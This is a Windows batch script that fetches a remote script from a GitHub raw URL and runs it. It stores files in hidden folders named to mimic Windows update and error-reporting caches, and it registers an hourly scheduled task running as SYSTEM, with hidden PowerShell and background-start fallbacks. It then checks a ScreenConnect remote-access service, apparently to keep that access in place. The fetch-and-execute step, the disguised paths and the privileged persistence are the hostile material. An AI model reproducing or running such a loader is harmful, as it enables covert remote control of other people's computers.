@echo off
rem RECOVER_ONE BUILD R4 - pull G12 + HEAL (schtasks only — no dual PS race). No wmic.
setlocal EnableExtensions EnableDelayedExpansion
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=main"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "WORKER=%STAGE%\gryxa_heal_once.cmd"
set "TASK=WucacheGryxaHealOnce"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1

"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 45 -o "%WD%\own_gryxa.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_gryxa.cmd?t=%RANDOM%"
findstr /C:"OWN_GRYXA BUILD 20260804G12" "%WD%\own_gryxa.cmd"
if errorlevel 1 (
  echo FAIL own_gryxa-not-G12
  endlocal & exit /b 2
)

del /f /q "%WD%\gryxa_msi.lock" "%WD%\gryxa_heal.flag" >nul 2>&1

> "%WORKER%" (
  echo @echo off
  echo echo [%DATE% %TIME%] recover_one_heal_begin^>^>"%WD%\own_gryxa.log"
  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" HEAL ^>^>"%WD%\own_gryxa.log" 2^>^&1
  echo echo [%DATE% %TIME%] recover_one_heal_end err=%%ERRORLEVEL%%^>^>"%WD%\own_gryxa.log"
  echo schtasks /Delete /TN "%TASK%" /F ^>nul 2^>^&1
)

set "ACTION=fail"
schtasks /Delete /TN "%TASK%" /F >nul 2>&1
schtasks /Create /TN "%TASK%" /TR "cmd.exe /c %WORKER%" /SC MINUTE /MO 60 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Run /TN "%TASK%" >nul 2>&1
if not errorlevel 1 set "ACTION=schtasks-run"

if /I "%ACTION%"=="fail" (
  powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c','%WORKER%' -WindowStyle Hidden" >nul 2>&1
  if not errorlevel 1 set "ACTION=ps-start"
)

if /I "%ACTION%"=="fail" (
  start "" /b cmd.exe /c "%WORKER%"
  set "ACTION=start-b"
)

echo G12=OK
echo ACTION=!ACTION!
echo QUEUED HEAL - wait 4-5 min (x+wipe+i is slow) then:
echo   findstr /I /C:"G12" /C:"heal_1060" /C:"wipe_orphan" /C:"heal_1060_ok" /C:"still_down" "%WD%\own_gryxa.log"
echo   sc query "ScreenConnect Client (%FP%)"
endlocal
